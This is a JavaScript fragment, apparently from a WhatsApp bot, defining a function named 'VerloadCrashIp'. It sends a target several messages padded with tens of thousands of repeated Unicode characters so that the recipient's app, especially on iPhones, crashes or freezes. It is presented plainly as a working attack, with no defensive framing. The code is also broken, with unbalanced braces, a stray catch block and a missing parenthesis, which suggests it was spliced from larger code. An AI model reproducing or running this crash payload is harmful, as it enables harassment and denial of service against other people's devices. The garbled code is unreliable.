async function VerloadCrashIp(target) {
const IphoneCrash = "VaxzyAnonymous👀" + "𑇂𑆵𑆴𑆿".repeat(60000);
await sock.relayMessage(target, {
locationMessage: {
degreesLatitude: 11.11,
degreesLongitude: -11.11,
name: "\u0000               " + IphoneCrash,
url: "https://t.me/vaacantivv"
}
}, {
participant: { jid: target }
});
    
await sock.sendMessage(target, {
text: "🧪‌⃰Ꮡ‌‌" + "VaxzyIsHere😴" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `VaxzyIsHere😴`,
body: `Haii ${pushname}`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/vaxzy`
}
}

sock.relayMessage(
target,
{
extendedTextMessage: {
text:  "𝐼⃪𝑂⃪𝑆" + "࣯ꦾ".repeat(90000),
contextInfo: {
fromMe: false,
stanzaId: target,
participant: target,
quotedMessage: {
conversation: "𝐵⃪𝐿⃪𝐴⃪𝑁⃪𝐾 𝐼⃪𝑂⃪𝑆 ‌" + "꧒꧆".repeat(90000),
},
disappearingMode: {
initiator: "CHANGED_IN_CHAT",
trigger: "CHAT_SETTING",
},
},
inviteLinkGroupTypeV2: "DEFAULT",
},
},
{
participant: {
jid: target,
},
},
{
messageId: null,
}
);
}

}, { quoted: m })
} catch (error) {
console.error("Message relay failed:", error);
}
}
}
}